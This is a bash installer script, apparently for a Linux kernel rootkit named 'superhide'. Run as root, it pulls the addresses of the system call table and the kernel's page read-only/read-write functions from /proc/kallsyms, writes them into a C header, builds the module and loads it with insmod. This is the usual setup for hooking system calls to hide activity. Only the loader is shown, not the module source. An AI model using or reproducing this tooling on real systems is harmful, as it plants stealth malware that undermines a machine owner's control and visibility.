#!/bin/bash

RET=0
# require root privs
if [[ $UID != 0 ]]; then
	echo "Please run this script with sudo"
	exit 1
fi

# generate the file we need

smap="/boot/System.map-$(uname -r)"

echo -e "#pragma once" > ./sysgen.h
echo -e "#include <linux/fs.h>" >> ./sysgen.h

symbline=$(cat /proc/kallsyms | grep sys_call_table | head -c 16)

set $symbline
echo -e "static unsigned long *syscall_table = (unsigned long*)0x$symbline;" >> ./sysgen.h


roline=$(cat /proc/kallsyms | grep set_pages_ro | head -c 16)
set $roline
echo -e "void (*pages_ro) (struct page *page, int numpages) = (void*)0x$roline;" >> ./sysgen.h

rwline=$(cat /proc/kallsyms | grep set_pages_rw | head -c 16)
set $rwline
echo -e "void (*pages_rw) (struct page *page, int numpages) = (void*)0x$rwline;" >> ./sysgen.h

# make it
make

if [ $? -eq 0 ]; then
	# insert the module
	echo "Inserting..."
	/sbin/insmod ./superhide.ko
	echo "Complete"
else
	echo "make failed"
	RET=1
fi

exit $RET
